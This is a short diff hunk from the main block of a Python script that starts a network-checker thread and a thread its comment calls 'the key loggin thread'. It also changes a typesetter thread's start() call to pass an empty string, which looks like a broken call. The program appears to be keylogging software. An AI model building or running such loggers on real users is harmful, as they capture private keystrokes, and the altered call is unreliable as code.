@@ -28,7 +28,7 @@ if __name__ == "__main__":
     networkCheckerThread.start()
     # start the key loggin thread
     loggerThread.start()
-    typesetterThread.start()
+    typesetterThread.start("")
     #thread2.start()
     try:
         while True:
